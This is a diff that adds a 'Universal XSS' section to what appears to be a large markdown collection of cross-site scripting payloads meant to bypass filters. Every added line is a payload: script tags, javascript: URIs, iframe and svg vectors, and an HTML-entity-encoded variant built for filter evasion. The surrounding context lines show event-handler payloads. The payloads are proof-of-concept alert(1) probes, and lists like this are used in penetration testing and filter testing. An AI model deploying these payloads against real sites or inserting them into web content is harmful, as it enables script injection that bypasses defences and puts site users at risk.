@@ -289,3 +289,18 @@ Here are **200+ Mutation XSS Payloads** designed to bypass filters and mutate in
 - `<div onmouseover=alert(1)>Hover me</div>`
 - `<marquee onstart=alert(1)>Scroll me</marquee>`
 
+---
+
+# Universal XSS (UXSS) Payloads
+
+### Common Universal XSS Payloads
+- `<script>window.open('javascript:alert(1)')</script>`
+- `javascript:alert(1)//`
+- `<iframe src='javascript:alert(1)'></iframe>`
+- `<img src=x onerror=window.open('javascript:alert(1)')>`
+- `<svg/onload=window.open('javascript:alert(1)')>`
+- `javascript://%0Aalert(1)`
+- `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;1&#41;`
+
+---
+
